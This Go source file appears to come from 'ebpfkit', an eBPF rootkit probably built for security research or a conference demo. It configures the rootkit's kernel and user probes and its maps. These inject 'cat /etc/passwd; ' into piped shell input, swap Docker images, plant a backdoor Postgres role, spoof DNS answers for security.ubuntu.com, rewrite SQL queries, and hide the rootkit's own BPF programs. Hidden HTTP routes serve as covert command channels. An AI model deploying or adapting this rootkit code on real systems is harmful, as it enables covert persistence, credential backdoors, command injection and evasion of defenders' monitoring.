/*
Copyright © 2020 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package ebpfkit

import (
	"math"
	"os"

	"github.com/DataDog/ebpf"
	"github.com/DataDog/ebpf/manager"
	"golang.org/x/sys/unix"
)

func (e *EBPFKit) setupManager() {
	e.manager = &manager.Manager{
		Probes: []*manager.Probe{
			{
				Section: "kprobe/do_exit",
			},
			{
				Section: "kprobe/__x64_sys_pipe",
			},
			{
				Section: "kprobe/__x64_sys_pipe2",
			},
			{
				Section: "kretprobe/__x64_sys_pipe",
			},
			{
				Section: "kretprobe/__x64_sys_pipe2",
			},
			{
				Section: "kprobe/__x64_sys_dup2",
			},
			{
				Section: "kprobe/__x64_sys_dup3",
			},
			{
				Section: "tracepoint/sched/sched_process_fork",
			},
			{
				Section: "kprobe/security_bprm_committed_creds",
			},
			{
				Section: "kprobe/__x64_sys_open",
			},
			{
				Section: "kretprobe/__x64_sys_open",
			},
			{
				Section: "kprobe/__x64_sys_openat",
			},
			{
				Section: "kretprobe/__x64_sys_openat",
			},
			{
				Section: "kprobe/__x64_sys_read",
			},
			{
				Section: "kretprobe/__x64_sys_read",
			},
			{
				Section: "kprobe/__x64_sys_close",
			},
			{
				Section: "tracepoint/raw_syscalls/sys_enter",
			},
			{
				Section: "tracepoint/raw_syscalls/sys_exit",
			},
		},
		Maps: []*manager.Map{
			{
				Name: "http_resp_pattern",
				Contents: []ebpf.MapKV{
					{
						Key:   []byte("HTTP/1.1 200 OK"),
						Value: uint8(1),
					},
				},
			},
			{
				Name: "comm_prog_key",
				Contents: []ebpf.MapKV{
					{
						Key: NewCommBuffer("cat", "python"),
						Value: CommProgKey{
							ProgKey: PipeOverridePythonKey,
							Backup:  0,
						},
					},
					{
						Key: NewCommBuffer("cat", "python3"),
						Value: CommProgKey{
							ProgKey: PipeOverridePythonKey,
							Backup:  0,
						},
					},
					{
						Key: NewCommBuffer("cat", "python3.8"),
						Value: CommProgKey{
							ProgKey: PipeOverridePythonKey,
							Backup:  0,
						},
					},
					{
						Key: NewCommBuffer("cat", "bash"),
						Value: CommProgKey{
							ProgKey: PipeOverrideShellKey,
							Backup:  1,
						},
					},
					{
						Key: NewCommBuffer("", "sh"),
						Value: CommProgKey{
							ProgKey: PipeOverrideShellKey,
							Backup:  1,
						},
					},
				},
			},
			{
				Name: "piped_progs",
				Contents: []ebpf.MapKV{
					{
						Key:   PipeOverridePythonKey,
						Value: NewPipedProgram("print('hello world')"),
					},
					{
						Key:   PipeOverrideShellKey,
						Value: NewPipedProgram("cat /etc/passwd; "),
					},
				},
			},
			{
				Name: "image_override",
				Contents: []ebpf.MapKV{
					//{
					//	Key: ImageOverrideKey{
					//		Prefix: 16,
					//		Image:  NewDockerImage68("k8s.gcr.io/pause"),
					//	},
					//	Value: ImageOverride{
					//		Override:    DockerImageReplace, // will turn into DockerImageReplace
					//		Ping:        PingNop,
					//		Prefix:      16,
					//		ReplaceWith: NewDockerImage64("gui774ume/pause2"),
					//	},
					//},
					//{
					//	Key: ImageOverrideKey{
					//		Prefix: 16,
					//		Image:  NewDockerImage68("gui774ume/pause2"),
					//	},
					//	Value: ImageOverride{
					//		Override: DockerImageNop,
					//		Ping:     PingRun,
					//		Prefix:   16,
					//	},
					//},
					{
						Key: ImageOverrideKey{
							Prefix: 6,
							Image:  NewDockerImage68("debian"),
						},
						Value: ImageOverride{
							Override:    DockerImageReplace,
							Ping:        PingNop,
							Prefix:      6,
							ReplaceWith: NewDockerImage64("ubuntu"),
						},
					},
				},
			},
			{
				Name: "dedicated_watch_keys",
				Contents: []ebpf.MapKV{
					{
						Key: uint32(0),
						Value: FSWatchKey{
							Flag:     uint8(0),
							Filepath: NewFSWatchFilepath("/ebpfkit/images_list"),
						},
					},
					{
						Key: uint32(1),
						Value: FSWatchKey{
							Flag:     uint8(0),
							Filepath: NewFSWatchFilepath("/ebpfkit/pg_credentials"),
						},
					},
				},
			},
			{
				Name: "postgres_roles",
				Contents: []ebpf.MapKV{
					{
						Key:   MustEncodeRole("webapp"),
						Value: MustEncodeMD5("hello", "webapp"),
					},
				},
			},
			{
				Name: "dns_table",
				Contents: []ebpf.MapKV{
					{
						Key:   MustEncodeDNS("security.ubuntu.com"),
						Value: MustEncodeIPv4("127.0.0.1"),
					},
					{
						Key:   MustEncodeDNS("google.fr"),
						Value: MustEncodeIPv4("127.0.0.1"),
					},
					{
						Key:   MustEncodeDNS("facebook.com"),
						Value: MustEncodeIPv4("172.217.19.227"),
					},
				},
			},
			{
				Name: "http_routes",
				Contents: []ebpf.MapKV{
					{
						Key: []byte("GET /add_fswatch"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							Handler:    AddFSWatchHandler,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},
					{
						Key: []byte("GET /del_fswatch"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							Handler:    DelFSWatchHandler,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},
					{
						Key: []byte("GET /get_fswatch"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							Handler:    GetFSWatchHandler,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},
					{
						Key: []byte("GET /put_pipe_pg"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							Handler:    PutPipeProgHandler,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},
					{
						Key: []byte("GET /del_pipe_pg"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							Handler:    DelPipeProgHandler,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},
					{
						Key: []byte("GET /put_doc_img"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							Handler:    PutDockerImageHandler,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},
					{
						Key: []byte("GET /del_doc_img"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							Handler:    DelDockerImageHandler,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},
					{
						Key: []byte("GET /put_pg_role"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							Handler:    PutPostgresRoleHandler,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},
					{
						Key: []byte("GET /del_pg_role"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							Handler:    DelPostgresRoleHandler,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},

					{
						Key: []byte("GET /hellofriend"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							NewDataLen: HealthCheckRequestLen,
							NewData:    HealthCheckRequest,
						},
					},
					{
						Key: []byte("GET /another_one"),
						Value: HTTPRoute{
							HTTPAction: Edit,
							NewDataLen: uint32(255),
							NewData:    NewHTTPDataBuffer("POST /api/products HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nContent-Length: 0\nHost: localhost:8000"),
						},
					},
				},
			},
			{
				Name: "query_override_pattern",
				Contents: []ebpf.MapKV{
					{
						Key:   []byte("SELECT * FROM product WHERE category='defcon'"),
						Value: []byte("SELECT * FROM product WHERE category='defconn"),
					},
				},
			},
			{
				Name: "http_response_gen",
			},
			{
				Name: "http_resp_gen",
			},
			{
				Name: "http_responses",
			},
			{
				Name: "read_cache",
			},
			{
				Name: "open_cache",
			},
			{
				Name: "pipe_ctx",
			},
			{
				Name: "piped_data_backup",
			},
			{
				Name: "piped_data_backup_gen",
			},
			{
				Name: "pipelines",
			},
			{
				Name: "pipe_writers",
			},
			{
				Name: "piped_progs_gen",
			},
			{
				Name: "pid_pipe_tokens",
			},
			{
				Name: "dns_name_gen",
			},
			{
				Name: "dns_request_cache",
			},
			{
				Name: "fs_watches",
			},
			{
				Name: "fs_watch_gen",
			},
			{
				Name: "watched_fds",
			},
			{
				Name: "bpf_cache",
			},
			{
				Name: "bpf_programs",
			},
			{
				Name: "bpf_next_id",
			},
			{
				Name: "bpf_maps",
			},
			{
				Name: "xdp_progs",
			},
			{
				Name: "sys_enter_progs",
			},
			{
				Name: "image_override_gen",
			},
			{
				Name: "postgres_list_cursor",
			},
			{
				Name: "image_list_cursor",
			},
			{
				Name: "image_cache",
			},
		},
	}
	e.managerOptions = manager.Options{
		// DefaultKProbeMaxActive is the maximum number of active kretprobe at a given time
		DefaultKProbeMaxActive: 512,

		VerifierOptions: ebpf.CollectionOptions{
			Programs: ebpf.ProgramOptions{
				// LogSize is the size of the log buffer given to the verifier. Give it a big enough (2 * 1024 * 1024)
				// value so that all our programs fit. If the verifier ever outputs a `no space left on device` error,
				// we'll need to increase this value.
				LogSize: 2097152,
			},
		},

		// Extend RLIMIT_MEMLOCK (8) size
		// On some systems, the default for RLIMIT_MEMLOCK may be as low as 64 bytes.
		// This will result in an EPERM (Operation not permitted) error, when trying to create an eBPF map
		// using bpf(2) with BPF_MAP_CREATE.
		//
		// We are setting the limit to infinity until we have a better handle on the true requirements.
		RLimit: &unix.Rlimit{
			Cur: math.MaxUint64,
			Max: math.MaxUint64,
		},

		ConstantEditors: []manager.ConstantEditor{
			{
				Name:  "http_server_port",
				Value: uint64(e.options.TargetHTTPServerPort),
			},
			{
				Name:  "ebpfkit_pid",
				Value: uint64(os.Getpid()),
			},
		},

		TailCallRouter: []manager.TailCallRoute{
			// xdp router
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(HTTPActionHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/http_action",
				},
			},
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(AddFSWatchHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/add_fs_watch",
				},
			},
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(DelFSWatchHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/del_fs_watch",
				},
			},
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(DNSResponseHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/handle_dns_resp",
				},
			},
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(PutPipeProgHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/put_pipe_prog",
				},
			},
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(DelPipeProgHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/del_pipe_prog",
				},
			},
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(PutDockerImageHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/put_doc_img",
				},
			},
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(DelDockerImageHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/del_doc_img",
				},
			},
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(DelPostgresRoleHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/del_pg_role",
				},
			},
			{
				ProgArrayName: "xdp_progs",
				Key:           uint32(PutPostgresRoleHandler),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "xdp/ingress/put_pg_role",
				},
			},

			// raw tracepoint router
			{
				ProgArrayName: "sys_enter_progs",
				Key:           uint32(newfstatat),
				ProbeIdentificationPair: manager.ProbeIdentificationPair{
					Section: "tracepoint/raw_syscalls/newfstatat",
				},
			},
		},
	}

	// add docker probe if the provided daemon exist
	if fi, err := os.Stat(e.options.DockerDaemonPath); err == nil && fi != nil {
		e.manager.Probes = append(e.manager.Probes, &manager.Probe{
			Section:       "uprobe/ParseNormalizedNamed",
			MatchFuncName: "github.com/docker/docker/vendor/github.com/docker/distribution/reference.ParseNormalizedNamed",
			BinaryPath:    e.options.DockerDaemonPath,
		})
	}

	// add postgres probes if the provided path exist
	if fi, err := os.Stat(e.options.PostgresqlPath); err == nil && fi != nil {
		e.manager.Probes = append(e.manager.Probes, &manager.Probe{
			Section:    "uprobe/md5_crypt_verify",
			BinaryPath: e.options.PostgresqlPath,
		})
		e.manager.Probes = append(e.manager.Probes, &manager.Probe{
			Section:    "uprobe/plain_crypt_verify",
			BinaryPath: e.options.PostgresqlPath,
		})
	}

	// add network probes
	if !e.options.DisableNetwork {
		e.manager.Probes = append(e.manager.Probes, []*manager.Probe{
			{
				UID:           "ingress",
				Section:       "xdp/ingress",
				Ifname:        e.options.IngressIfname,
				XDPAttachMode: manager.XdpAttachModeSkb,
			},
			{
				UID:              "egress",
				Section:          "classifier/egress",
				Ifname:           e.options.EgressIfname,
				NetworkDirection: manager.Egress,
			},
			{
				UID:           "lo",
				Section:       "xdp/ingress",
				Ifname:        "lo",
				XDPAttachMode: manager.XdpAttachModeSkb,
			},
			{
				UID:              "lo",
				Section:          "classifier/egress",
				Ifname:           "lo",
				NetworkDirection: manager.Egress,
			},
		}...)
	}

	// add bpf probes
	if !e.options.DisableBPFObfuscation {
		e.manager.Probes = append(e.manager.Probes, []*manager.Probe{
			{
				Section: "kprobe/__x64_sys_bpf",
			},
			{
				Section: "kretprobe/__x64_sys_bpf",
			},
			{
				Section: "kprobe/bpf_prog_kallsyms_add",
			},
			{
				Section: "kprobe/bpf_map_new_fd",
			},
		}...)
	}

	// add webapp probes
	if fi, err := os.Stat(e.options.WebappPath); err == nil && fi != nil {
		e.manager.Probes = append(e.manager.Probes, []*manager.Probe{
			{
				Section:       "uprobe/SQLiteConnQuery",
				MatchFuncName: "SQLiteConn\\).Query", // mattn/go-sqlite3.(*SQLiteConn).QueryContext
				BinaryPath:    e.options.WebappPath,
			},
			{
				Section:       "uprobe/SQLDBQueryContext",
				MatchFuncName: "DB\\).QueryContext", // database/sql.(*DB).QueryContext
				BinaryPath:    e.options.WebappPath,
			},
		}...)
	}
}
